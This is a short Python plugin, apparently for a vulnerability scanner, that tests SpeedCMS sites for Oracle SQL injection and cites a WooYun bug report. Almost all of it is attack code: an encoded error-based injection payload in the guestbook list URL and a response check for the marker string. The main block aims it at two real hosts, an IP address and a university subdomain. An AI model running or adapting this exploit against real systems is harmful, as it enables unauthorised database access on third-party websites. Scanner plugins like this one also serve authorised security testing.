#!/usr/bin/env python
# -*- coding: utf-8 -*-
#_PlugName_ = SpeedCMS某处Oracle注射
#__Refer___ = http://www.wooyun.org/bugs/wooyun-2015-0136530
import re
def assign(service, arg):
    if service == 'speedcms':
        return True, arg
def audit(arg):
    payload = "guestbook/list/portalId/86/cid/828%27)%20AND%206152=(SELECT%20UPPER(XMLType(CHR(60)%7C%7CCHR(58)%7C%7CCHR(113)%7C%7CCHR(112)%7C%7CCHR(120)%7C%7CCHR(106)%7C%7CCHR(113)%7C%7C(SELECT%20(CASE%20WHEN%20(6152=6152)%20THEN%201%20ELSE%200%20END)%20FROM%20DUAL)%7C%7CCHR(113)%7C%7CCHR(107)%7C%7CCHR(98)%7C%7CCHR(106)%7C%7CCHR(113)%7C%7CCHR(62)))%20FROM%20DUAL)%20AND%20(%27JTxZ%27=%27JTxZ"
    target = arg + payload
    code, head, res, errcode, _ = curl.curl2(target)
    if code == 200 and "qpxjq1qkbjq" in res:
        security_note(target)
if __name__ == '__main__':
    from dummy import *
    audit(assign('speedcms', 'http://222.179.234.145/')[1])
    audit(assign('speedcms', 'http://hxhgsyzx.yznu.cn/')[1])